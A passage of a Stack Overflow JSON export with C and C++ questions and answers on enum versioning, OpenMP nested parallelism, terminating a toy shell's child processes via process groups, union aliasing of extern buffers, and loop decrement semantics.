to the <code>Version</code>. Consequently all <code>type*.cpp</code> files will be compiled, even though only <code>read()</code> of <code>ObjectA</code> really needs the <code>v100</code> entry.</p>\n\n<p><strong>How can I invert the dependency on the enum, with minimal changes to the client (i.e. <code>type*.cpp</code>) code, so that only the necessary .c files compile ?</strong></p>\n\n<p>Here is a possible solution, that I thought of, but I need a better one:</p>\n\n<p>I was thinking that I could put the enum in a .cpp file, and expose <code>int</code>s with the values of the respective enum members:</p>\n\n<pre><code>//version.cpp\nenum eVersion {\n    ev1 = 1,\n    ev2, ev3, ev4, ev5, ... ev100\n};\n\nconst int v1 = ev1;\nconst int v2 = ev2;\n....\nconst int v100 = ev100;   // introduce a new global int for every new entry in the enum\n</code></pre>\n\n<p>make an alias for the <code>Version</code> type somehow</p>\n\n<pre><code>//version.h\ntypedef const int Version;\n</code></pre>\n\n<p>and introduce only the const int values that are needed each time:</p>\n\n<pre><code>// typeA.cpp\n#include \"version.h\"\n\nextern Version v100;    ///// *** will be resolved at link time\n\nvoid read (FILE *f, ObjectA *p, Version v) \n{\n    read_float(f, &amp;p-&gt;x);\n    read_float(f, &amp;p-&gt;y);\n    if (v &gt;= v100) { \n        read_float(f, &amp;p-&gt;z);  // after v100 ObjectA becomes a 3D\n    }\n}\n</code></pre>\n\n<p>but I think this looks like very poor solution, which dates back to pre-header times</p>\n"}, {"tags": ["c++", "c", "multiprocessing", "openmp"], "comments": [{"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 2, "creation_date": 1447260656, "post_id": 33655326, "comment_id": 55084415, "body": "I suggest you to tag this also with openmp"}], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 5543413, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/69fb2b14b748fe0f159f67cf8c7102c4?s=128&d=identicon&r=PG&f=1", "display_name": "Lobo", "link": "https://stackoverflow.com/users/5543413/lobo"}, "edited": false, "score": 0, "creation_date": 1447260997, "post_id": 33655617, "comment_id": 55084661, "body": "Yes i tried to put number of threads to inner regions like this, but they still get only two threads as outer region."}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 115, "user_id": 5543413, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/69fb2b14b748fe0f159f67cf8c7102c4?s=128&d=identicon&r=PG&f=1", "display_name": "Lobo", "link": "https://stackoverflow.com/users/5543413/lobo"}, "edited": false, "score": 0, "creation_date": 1447261452, "post_id": 33655617, "comment_id": 55084904, "body": "This should work to set the number of threads working on the for(...) not on a region."}, {"owner": {"reputation": 115, "user_id": 5543413, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/69fb2b14b748fe0f159f67cf8c7102c4?s=128&d=identicon&r=PG&f=1", "display_name": "Lobo", "link": "https://stackoverflow.com/users/5543413/lobo"}, "edited": false, "score": 0, "creation_date": 1447262303, "post_id": 33655617, "comment_id": 55085428, "body": "Even if i put 4 threads into for parellel loops, omp_get_num_threads( ) - gives me same anserw (that only two threads are working in this loop). It seems that it depends from how many threads i set before outer region, but even if i set 8 of them they are all working in inner regions ( and i can&#39;t divide them to work into both of them in the same time)"}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 115, "user_id": 5543413, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/69fb2b14b748fe0f159f67cf8c7102c4?s=128&d=identicon&r=PG&f=1", "display_name": "Lobo", "link": "https://stackoverflow.com/users/5543413/lobo"}, "edited": false, "score": 0, "creation_date": 1447272791, "post_id": 33655617, "comment_id": 55091592, "body": "It is hard to answer, update your question, post a working code so that I can test it."}], "tags": [], "owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "is_accepted": false, "score": 0, "last_activity_date": 1447260779, "last_edit_date": 1495539873, "creation_date": 1447260779, "answer_id": 33655617, "question_id": 33655326, "link": "https://stackoverflow.com/questions/33655326/open-mp-nested-parallelism/33655617#33655617", "title": "Open Mp nested parallelism", "body": "<p>It is possible to set the number of threads on a loop with this:</p>\n\n<pre><code>#pragma parallel for num_threads(variable)\n</code></pre>\n\n<p>see also this post <a href=\"https://stackoverflow.com/questions/22813923/openmp-difference-beetween-num-threads-vs-omp-set-num-threads-vs-omp-num-thread\">openmp difference beetween num_threads vs. omp_set_num_threads vs OMP_NUM_THREADS</a></p>\n"}, {"tags": [], "owner": {"reputation": 1838, "user_id": 4525052, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/0780adfbbb6b445dac0c9e12d3c73f50?s=128&d=identicon&r=PG&f=1", "display_name": "RyanP", "link": "https://stackoverflow.com/users/4525052/ryanp"}, "is_accepted": true, "score": 3, "last_activity_date": 1447261956, "creation_date": 1447261956, "answer_id": 33655980, "question_id": 33655326, "link": "https://stackoverflow.com/questions/33655326/open-mp-nested-parallelism/33655980#33655980", "title": "Open Mp nested parallelism", "body": "<p>This works in VS2012</p>\n\n<p>example:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;omp.h&gt;\n\nint main()\n{\n    omp_set_nested(2);\n\n    #pragma omp parallel num_threads( 2 )\n    {\n        int threadID1 = omp_get_thread_num();\n\n        #pragma omp parallel num_threads( 4 )\n        {\n            int threadID2 = omp_get_thread_num();\n\n            #pragma omp critical\n            {\n                std::cout &lt;&lt; \"tID1: \" &lt;&lt; threadID1 &lt;&lt; std::endl;\n                std::cout &lt;&lt; \"tID2: \" &lt;&lt; threadID2 &lt;&lt; std::endl;\n                std::cout &lt;&lt; std::endl;\n            }\n        }\n    }\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>tID1: 0\ntID2: 0\n\ntID1: 0\ntID2: 2\n\ntID1: 0\ntID2: 1\n\ntID1: 0\ntID2: 3\n\ntID1: 1\ntID2: 0\n\ntID1: 1\ntID2: 1\n\ntID1: 1\ntID2: 2\n\ntID1: 1\ntID2: 3\n</code></pre>\n"}], "owner": {"reputation": 115, "user_id": 5543413, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/69fb2b14b748fe0f159f67cf8c7102c4?s=128&d=identicon&r=PG&f=1", "display_name": "Lobo", "link": "https://stackoverflow.com/users/5543413/lobo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 969, "favorite_count": 0, "accepted_answer_id": 33655980, "answer_count": 2, "score": 5, "last_activity_date": 1447356396, "creation_date": 1447259870, "last_edit_date": 1447356396, "question_id": 33655326, "link": "https://stackoverflow.com/questions/33655326/open-mp-nested-parallelism", "title": "Open Mp nested parallelism", "body": "<p>So I have outer parallel region with two inner parallel regions. Is it possible to put 2 threads into outer parallel and 4 threads into each inner ones? I made something like this, but it seems not work how i want it to. Any suggestions?</p>\n\n<pre><code>start_r = omp_get_wtime();\nomp_set_nested(1);\nomp_set_num_threads(2);\n#pragma omp parallel \n{\n    printf(\"Thread %d executes the outer parallel region\\n\",omp_get_thread_num());\n    omp_set_num_threads(4);\n    #pragma omp parellel for private(i,j,color)schedule(guided, chunk) default(shared) \n    {\n\n// Blur\n    for (int i = 1; i &lt; x-1; i++)\n        for (int j = 1; j &lt; y-1; j++)\n            for (int k = 0; k &lt; 3; k++)\n            {   \n                wynik = 0;\n                wynik = ((color[(i-1)][((j - 1))][k] +\n                        color[(i-1)][j][k] +\n                        color[(i-1)][(j + 1)][k] +\n                        color[i][(j - 1)][k] +\n                        color[i][j][k] +\n                        color[i][(j + 1)][k] +\n                        color[(i+1)][(j - 1)][k] +\n                        color[(i+1)][j][k] +\n                        color[(i+1)][(j + 1)][k])/9);\n                if (wynik&gt;255)wynik = 255;\n                if (wynik&lt;0)wynik = 0;\n                color2[i][j][k] =  wynik;\n            }\n            stop_r = omp_get_wtime();\n            cout &lt;&lt; \"Wyostrzenie zejelo : \" &lt;&lt; (stop_r-start_r) &lt;&lt;\" sekund\"&lt;&lt; endl;\n            cout&lt;&lt;omp_get_nested( )&lt;&lt;endl;\n            cout&lt;&lt;\"Ilo\u015b\u0107 w\u0105tk\u00f3w dla rozmycia : \"&lt;&lt;omp_get_num_threads( )&lt;&lt;endl;\n            printf(\"Thread %d executes the inner parallel region\\n\",omp_get_thread_num());\n        }\n        omp_set_num_threads(4);\n#pragma omp parellel for schedule(guided, chunk) privat(i,j,color) default(shared)\n{\n// Sharp\n    for (int i = 1; i &lt; x - 1; i++)\n        for (int j = 1; j &lt; y - 1; j++)\n            for (int k = 0; k &lt; 3; k++)\n            {\n                wynik = 0;\n                wynik = (color[(i-1)][(j - 1)][k] * (0) +\n                        color[(i-1)][j][k] * (-1) +\n                        color[(i-1)][(j + 1)][k] * (0) +\n                        color[i][(j - 1)][k] * (-1) +\n                        color[i][j][k] * 20 +\n                        color[i][(j + 1)][k] * (-1) +\n                        color[(i+1)][(j - 1)][k] * (0) +\n                        color[(i+1)][j][k] * (-1) +\n                        color[(i+1)][(j + 1)][k] * (0))/16;\n                wynik = wynik % 255;\n                color3[i][j][k] = wynik;\n\n\n\n            }\n            cout&lt;&lt;omp_get_nested( )&lt;&lt;endl;\n            cout&lt;&lt;\"Ilo\u015b\u0107 w\u0105tk\u00f3w dla wyostrzenia : \"&lt;&lt;omp_get_num_threads( )&lt;&lt;endl;\n            printf(\"Thread %d executes the inner parallel region\\n\",omp_get_thread_num());\n            }\n        }\n    for (int j = 0; j &lt; y; j++)\n        for (int i = 0; i &lt; x; i++)     \n            {\n                fwrite(color2[i][j], 1, 3, fp2);\n                fwrite(color3[i][j], 1, 3, fp3);\n\n            }\n\n\n\n    fclose(fp);\n    fclose(fp2);\n    fclose(fp3);\n\n    system(\"PAUSE\");\n    return 0;\n}\n}\n</code></pre>\n"}, {"tags": ["c", "shell", "fork", "exit", "child-process"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1447259678, "post_id": 33655216, "comment_id": 55083780, "body": "Why are those processes hanging around waiting for input?  Shouldn&#39;t they have exited?  If you&#39;ve got a record of all your direct children, you could have your parent shell send them death threats (SIGHUP, SIGTERM).  But it shouldn&#39;t be necessary.  Unless a shell is interactive, it should exit on error, or reaching the end of its script."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1447260425, "post_id": 33655216, "comment_id": 55084268, "body": "Yes, even with a true shell it is more than a bad idea to spawn commands that interact with stdin in the background\u2026 As stated by @JonathanLeffler whatever your shell should keep track of PIDs of background process, at least to get their returncode (as done by BASH for ex.)."}, {"owner": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 0, "creation_date": 1447279276, "post_id": 33655216, "comment_id": 55094888, "body": "If your shell does not support job control (which is very likely since you didn&#39;t mention it), you most definitely don&#39;t want / need to do this, and it&#39;s a strong hint that you&#39;re doing something wrong. When the shell forks to execute a user-typed command, it should wait for that process to terminate before accepting further input. This in turn implies that the user can&#39;t type <code>exit</code> until the previous command terminates. So you shouldn&#39;t have to worry about that at all. Of course, the command may have forked and exited immediately, but for a university assignment I wouldn&#39;t worry about that."}], "answers": [{"comments": [{"owner": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 0, "creation_date": 1447279728, "post_id": 33655846, "comment_id": 55095088, "body": "<code>setpgid(2)</code> returns <code>int</code>, there&#39;s no need to perform casting in the <code>if</code>. Also, the way the question is phrased, it seems like multiple processes are concurrently trying to read from <code>stdin</code> (which is arguably undesirable), so doing this in the main shell program would not necessarily fix it, unless you&#39;re lucky enough to have that exact input line delivered to the shell process."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "reply_to_user": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 0, "creation_date": 1447279890, "post_id": 33655846, "comment_id": 55095153, "body": "@FilipeGon&#231;alves: yes you&#39;re right. Confusion with <code>getpgid()</code>. I correct the post."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "reply_to_user": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 0, "creation_date": 1447280058, "post_id": 33655846, "comment_id": 55095236, "body": "Note: for the &quot;multiple processes are concurrently trying to read from stdin&quot;, as it is a nonsense (as you stated) I presumed a coherent code :)"}], "tags": [], "owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "is_accepted": false, "score": 2, "last_activity_date": 1449716621, "last_edit_date": 1449716621, "creation_date": 1447261508, "answer_id": 33655846, "question_id": 33655216, "link": "https://stackoverflow.com/questions/33655216/in-a-basic-shell-program-in-c-how-to-exit-all-processes-associated-with-a-paren/33655846#33655846", "title": "In a basic Shell Program in C, how to exit all processes associated with a parent?", "body": "<p>As said in comments, you should not spawn interactive processes in the background (at least how your shell and your command will handle the only stdin?).</p>\n\n<p>Also as a shell you should keep track of all spawned processes (in background) so that you are able to catch their return code, as done in sh/bash (at least). For exemple in bash:</p>\n\n<pre><code>&gt; sleep 1 &amp;\n[1] 8215\n&gt;\n(1 sec later)\n[1]+  Terminated      sleep 1\n</code></pre>\n\n<p>So if you have the list of existing children you can send SIGINT/SIGKILL to all of them.</p>\n\n<p>Whatever if you really want to be sure to kill everyone you should use process group (PG) killing. Using <code>kill()</code> function with PID=0 sends the kill signal to all processes in the same process group than you.\nSo you can start your shell by setting a new process group (to be sure to not kill something else), and this PG will be inherited by your children (appart if a child set a new PG of course).</p>\n\n<p>This would looks like:</p>\n\n<pre><code>// at the begining of your main code\n// try to get a new process group for me\nx = setpgid(0,0);\nif (x == -1) {\n  perror(\"setpgid\");\n  exit(1);\n}\n(\u2026)\n// here you're about to exit from main, just kill\n// all members of your group\nkill(0, SIGINT);  // send an INT signal\nkill(0, SIGKILL); // paranoid: if a child catch INT it will get a KILL\n\n// now you can exit, but you're probably dead 'cause you\n// also receive the SIGINT. If you want to survive you have to\n// catch SIGINT, but you will not catch KILL whatever\n</code></pre>\n\n<p>If it is needed for you to survive the kill you may catch the signal using <code>signal()</code> or better <code>sigaction()</code> so that you will not be killed and so able to perform other before-exit actions.</p>\n"}], "owner": {"reputation": 129, "user_id": 5206524, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/10207297717872158/picture?type=large", "display_name": "Joe", "link": "https://stackoverflow.com/users/5206524/joe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2133, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1449716621, "creation_date": 1447259522, "question_id": 33655216, "link": "https://stackoverflow.com/questions/33655216/in-a-basic-shell-program-in-c-how-to-exit-all-processes-associated-with-a-paren", "title": "In a basic Shell Program in C, how to exit all processes associated with a parent?", "body": "<p>I am writing a basic shell program for a university assignment, and i need to test for when the user enters the string \"exit\". When this happens the program should quit. </p>\n\n<p>I can test for this successfully, but if i have forked new processes that have dealt with an strerror in my program, i have to keep entering exit for however many active processes are running at that current time. </p>\n\n<p>Is there a way of exiting all associated processes with a program under this condition? </p>\n\n<p>Cheers. </p>\n"}, {"tags": ["c", "embedded", "unions"], "comments": [{"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 2, "creation_date": 1447267874, "post_id": 33655187, "comment_id": 55088859, "body": "Why do you want to access what would essentially be the same buffer via two different names?  Why not define one global buffer and reference it by the same name everywhere you use it?"}], "answers": [{"comments": [{"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "edited": false, "score": 0, "creation_date": 1447341253, "post_id": 33656075, "comment_id": 55122389, "body": "+1 That is very clever. It opens up an entire world of (often incredibly devious and dangerous) possibilities. I hope I don&#39;t have to use it, but it&#39;s a great trick to know just in case."}], "tags": [], "owner": {"reputation": 12213, "user_id": 671703, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/96ac349a9c65277e304401ea92a62ff4?s=128&d=identicon&r=PG", "display_name": "pat", "link": "https://stackoverflow.com/users/671703/pat"}, "is_accepted": false, "score": 2, "last_activity_date": 1447287789, "last_edit_date": 1447287789, "creation_date": 1447262214, "answer_id": 33656075, "question_id": 33655187, "link": "https://stackoverflow.com/questions/33655187/union-variables-from-separate-files-in-c/33656075#33656075", "title": "Union variables from separate files in C", "body": "<p>The <code>extern</code> declarations simply tell the compiler that these variables exist somewhere, and what their types are.  When you reference those symbols, the compiler will leave a hole in the code where the linker can plug in the actual addresses once they are known.  You will need to arrange for the linker to assign the same address to both symbols.  You could declare a global variable called <code>Buffer1and2</code> of the union type, and then use some inline asm to <code>equ</code>ate <code>Buffer1</code> and <code>Buffer2</code> to <code>Buffer1and2</code>.  The <code>equ</code> should create new symbols in the symbol table with the same value (address).</p>\n\n<p>Note that this does not work for non-static or uninitialized data which is placed in the <code>.comm</code> section.  This is a pretty ugly hack, but it does cause two separate global variables to appear at the same address without them appearing to be union members...</p>\n\n<p>dut.h</p>\n\n<pre><code>typedef char Buffer1[25];\ntypedef char Buffer2[30];\n\nextern Buffer1 buffer1;\nextern Buffer2 buffer2;\n</code></pre>\n\n<p>dut.c</p>\n\n<pre><code>#include \"dut.h\"\n\nstatic union {\n    Buffer1 buffer1;\n    Buffer2 buffer2;\n} bufferX;\n\n__asm(\".globl  buffer1\\n\"\n      \".equ    buffer1, bufferX\\n\"\n      \".globl  buffer2\\n\"\n      \".equ    buffer2, bufferX\\n\");\n</code></pre>\n\n<p>main.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"dut.h\"\n\nint main(int argc, char **argv)\n{\n    buffer1[0] = 0xa5;\n    printf(\"%02x\\n\", buffer2[0]);\n    return 0;\n}\n</code></pre>\n\n<p>Note that this should be a last resort, if you cannot modify the code that refers to <code>buffer1</code> and <code>buffer2</code>.  If you can modify the code, then you should just extern a union, and have the code refer to one of the members of the union, as described in @Dmitri's answer.</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1447262703, "creation_date": 1447262703, "answer_id": 33656217, "question_id": 33655187, "link": "https://stackoverflow.com/questions/33655187/union-variables-from-separate-files-in-c/33656217#33656217", "title": "Union variables from separate files in C", "body": "<p>Suggest  declare the union in one file,  </p>\n\n<p>a common header file needs an 'extern' for that union and the union definition.   </p>\n\n<p>Each file that uses that union needs to include the common header.</p>\n"}, {"comments": [{"owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "edited": false, "score": 0, "creation_date": 1447263842, "post_id": 33656528, "comment_id": 55086344, "body": "Obviously, doing stuff like this comes with certain risks. Be sure you know what you are doing when it comes to concurrency and management of your program&#39;s complexity and maintainability. In embedded systems you sometimes have to break the high-level software design rules, but be careful."}], "tags": [], "owner": {"reputation": 1068, "user_id": 492520, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2ddf2ce3e4bb2499b3759ed779c48813?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/492520/dmitri"}, "is_accepted": false, "score": 1, "last_activity_date": 1447263647, "creation_date": 1447263647, "answer_id": 33656528, "question_id": 33655187, "link": "https://stackoverflow.com/questions/33655187/union-variables-from-separate-files-in-c/33656528#33656528", "title": "Union variables from separate files in C", "body": "<p>A good way of organizing this is to have a common_buffer.h that defines the struct and includes the extern declaration (don't forget the include guards):</p>\n\n<pre><code>typedef union {\n    uint16_t buf1[BUF1_SIZE];\n    uint8_t  buf2[BUF2_SIZE];\n} uBuffers_type;\n\nextern uBuffers_type ubuffers_var;\n</code></pre>\n\n<p>you can either include the actual allocation for it in an existing compilation unit (.c file) or create a separate common_buffer.c which contains</p>\n\n<pre><code>#include \"common_buffer.h\"\nuBuffers_type ubuffers_var;\n</code></pre>\n\n<p>Be sure that the non-extern variable declaration appears once and only once in your entire project. From there on, any file where you</p>\n\n<pre><code>#include \"common_buffer.h\"\n</code></pre>\n\n<p>will be able to use the buffers with something like</p>\n\n<pre><code>ubuffers_var.buf1[index] = someUInt16;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>someUInt8 = ubuffers_var.buf2[other_index];\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 39687, "user_id": 79566, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/edad7f3ab41c3bdfdf851759dce5c33b?s=128&d=identicon&r=PG", "display_name": "bta", "link": "https://stackoverflow.com/users/79566/bta"}, "is_accepted": false, "score": 0, "last_activity_date": 1447286983, "creation_date": 1447286983, "answer_id": 33662227, "question_id": 33655187, "link": "https://stackoverflow.com/questions/33655187/union-variables-from-separate-files-in-c/33662227#33662227", "title": "Union variables from separate files in C", "body": "<p>I think you might be misunderstanding something here.</p>\n\n<p>The code <code>extern char Buffer1[ 10 ];</code> says that an object is declared in another file.  That is, ten <code>char</code>s' worth of space has been allocated and given the name <code>Buffer1</code>.</p>\n\n<p>The code <code>typedef union {  Buffer1;  Buffer2; } uBuffers;</code> only defines a data type called <code>uBuffers</code>.  No storage has been allocated, and no object exists until you declare one.</p>\n\n<p>You can't use a union to take two already-existing objects and tell the compiler that they should share the same memory space.  You have to <em>replace</em> the existing objects with a union.  For example, use something like this in a header visible to both source files:</p>\n\n<pre><code>// create union data type\nunion my_union\n{\n    char Buffer1[10];\n    char Buffer2[15];\n};\n\n// the real declaration needs to be added to a source file somewhere\nextern union my_union buffers;\n</code></pre>\n\n<p>In your particular case, both objects are char arrays so the easier solution is to just have a single buffer like <code>char buffer[15];</code>.  The union method is generally more useful when different members have drastically different data types.</p>\n"}], "owner": {"reputation": 11, "user_id": 5551186, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2545748ee0465251d73f192e322de590?s=128&d=identicon&r=PG&f=1", "display_name": "Chimpster", "link": "https://stackoverflow.com/users/5551186/chimpster"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 283, "favorite_count": 1, "answer_count": 4, "score": 1, "last_activity_date": 1490544190, "creation_date": 1447259452, "last_edit_date": 1490544190, "question_id": 33655187, "link": "https://stackoverflow.com/questions/33655187/union-variables-from-separate-files-in-c", "title": "Union variables from separate files in C", "body": "<p>Is it possible to union a variable declared <code>extern</code> in another file? This is for an embedded application where memory needs to be preserved, so sharing as much as possible.\nie:</p>\n\n<p>file1.h:</p>\n\n<pre><code>extern char Buffer1[ 10 ];\n</code></pre>\n\n<p>file2.h</p>\n\n<pre><code>extern char Buffer2[ 15 ];\n</code></pre>\n\n<p>?????</p>\n\n<pre><code>typedef union\n{\n  Buffer1; \n  Buffer2;\n} uBuffers;\n</code></pre>\n\n<p>I realize this is not the correct syntax without the type, but if the type is used then a new variable is declared. They could be explicitly placed in RAM but that removes flexibility.</p>\n\n<p>Edit:\nThanks for the answers.\nWhat I should have made clear is the reason this situation has arisen.\nI have had to include some optimised assembler that uses the variables I was hoping to union together. However the assembler syntax does not allow unions ie EXTERN uBuffers.Buffer1 - generates a syntax error.</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 6533, "user_id": 1918193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b70a14318e0f417ecac47809f38fafc?s=128&d=identicon&r=PG", "display_name": "Marc Glisse", "link": "https://stackoverflow.com/users/1918193/marc-glisse"}, "edited": false, "score": 4, "creation_date": 1447259451, "post_id": 33655155, "comment_id": 55083651, "body": "Add <code>while(--n)</code> to the mix..."}, {"owner": {"reputation": 43, "user_id": 5206448, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KfpDG.jpg?s=128&g=1", "display_name": "Md Tawfique Hossain", "link": "https://stackoverflow.com/users/5206448/md-tawfique-hossain"}, "reply_to_user": {"reputation": 6533, "user_id": 1918193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b70a14318e0f417ecac47809f38fafc?s=128&d=identicon&r=PG", "display_name": "Marc Glisse", "link": "https://stackoverflow.com/users/1918193/marc-glisse"}, "edited": false, "score": 0, "creation_date": 1447259565, "post_id": 33655155, "comment_id": 55083713, "body": "its also giving me same result as like while(n=n-1) &lt; I input 3 and than i can input 2 times numbers ! :("}, {"owner": {"reputation": 6533, "user_id": 1918193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b70a14318e0f417ecac47809f38fafc?s=128&d=identicon&r=PG", "display_name": "Marc Glisse", "link": "https://stackoverflow.com/users/1918193/marc-glisse"}, "edited": false, "score": 1, "creation_date": 1447259617, "post_id": 33655155, "comment_id": 55083743, "body": "Well now you can search for the difference between <code>n--</code> and <code>--n</code>, which is described all over the place."}, {"owner": {"reputation": 716, "user_id": 2031180, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/jkKlR.jpg?s=128&g=1", "display_name": "campescassiano", "link": "https://stackoverflow.com/users/2031180/campescassiano"}, "edited": false, "score": 0, "creation_date": 1447259809, "post_id": 33655155, "comment_id": 55083886, "body": "To see in practice what is the difference, you can compile and see what your compiler is doing. In gcc: <code>gcc -S my_source.c -o my_source.s</code> It will make the compiler stop in assembly step, then you can compare both source codes and see what is the difference in terms of assembly."}, {"owner": {"reputation": 43, "user_id": 5206448, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KfpDG.jpg?s=128&g=1", "display_name": "Md Tawfique Hossain", "link": "https://stackoverflow.com/users/5206448/md-tawfique-hossain"}, "edited": false, "score": 0, "creation_date": 1503234049, "post_id": 33655155, "comment_id": 78522136, "body": "Thanks all . its worked .. hahaha...forgot to replied ."}], "answers": [{"tags": [], "owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "is_accepted": true, "score": 4, "last_activity_date": 1447260004, "last_edit_date": 1447260004, "creation_date": 1447259853, "answer_id": 33655320, "question_id": 33655155, "link": 